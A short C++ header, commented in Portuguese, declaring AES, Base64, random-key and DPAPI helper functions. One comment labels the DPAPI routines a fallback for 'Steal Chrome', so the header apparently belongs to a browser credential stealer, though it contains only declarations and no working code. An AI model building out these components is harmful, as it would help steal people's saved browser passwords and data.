#pragma once

#include <vector>
#include <string>
#include <windows.h>

// AES256 CBC polimórfico, com salt dinâmico (openssl ou wincrypt)
std::vector<BYTE> EncryptAES(const BYTE* data, size_t sz);          // Criptografa array de bytes
std::vector<BYTE> DecryptAES(const BYTE* buf, size_t sz);           // Decripta array de bytes cifrado

// Gerador de key/iv randômicos
std::string GenRandomKey(int bytes);                                // Gera string de key/iv com entropia

// Base64 encoding/decoding para buffers
std::string Base64Encode(const BYTE* buf, size_t size);             // Envia/recebe dados pelo socket seguro
std::vector<BYTE> Base64Decode(const std::string& s);               // Restaura array de bytes

// DPAPI native Windows fallback (Steal Chrome, etc)
std::vector<BYTE> DpapiProtect(const std::vector<BYTE>& buf);       // Protege dados com DPAPI
std::vector<BYTE> DpapiUnprotect(const std::vector<BYTE>& buf);     // Desprotege dados com DPAPI
